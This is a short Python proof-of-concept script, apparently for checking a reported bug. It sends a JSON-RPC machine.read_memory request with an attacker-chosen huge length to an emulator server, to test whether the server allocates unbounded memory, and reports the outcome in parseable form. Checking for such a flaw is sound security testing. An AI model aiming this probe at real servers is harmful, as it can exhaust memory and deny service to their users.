# Create a tiny (4 MiB RAM) machine on the server, then issue a single
# machine.read_memory with an attacker-chosen huge `length` and print the outcome
# in a parseable form. Run with: python3 -I readmem.py <host> <port> <length>
import socket, sys, json

host = sys.argv[1]
port = int(sys.argv[2])
length = int(sys.argv[3])


def rpc(method, params, timeout=60):
    o = {"jsonrpc": "2.0", "id": 0, "method": method, "params": params}
    body = json.dumps(o).encode()
    hdr = ("POST / HTTP/1.1\r\nHost: h\r\nContent-Type: application/json\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n" % len(body)).encode()
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(hdr + body)
    d = b""
    while True:
        c = s.recv(65536)
        if not c:
            break
        d += c
    s.close()
    return d.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in d else d


rpc("machine.create", {"config": {"ram": {"length": 4194304}}, "runtime_config": {}})

# address 2147483648 == 0x80000000 (RAM start). Reads past the end of RAM return pristine zeros with
# no error, so the whole `length` buffer is allocated+filled: `length` is a raw untrusted uint64.
body = rpc("machine.read_memory", {"address": 2147483648, "length": length})
try:
    obj = json.loads(body)
except Exception as e:
    print("RESULT=noparse %r %r" % (e, body[:200]))
    sys.exit(0)
if "error" in obj:
    msg = str(obj["error"].get("message", ""))
    if "bad_alloc" in msg or "bad alloc" in msg:
        print("RESULT=bad_alloc msg=%s" % msg)
    else:
        print("RESULT=validation_error msg=%s" % msg)
else:
    res = obj.get("result", {})
    print("RESULT=ok keys=%r" % (list(res.keys())))
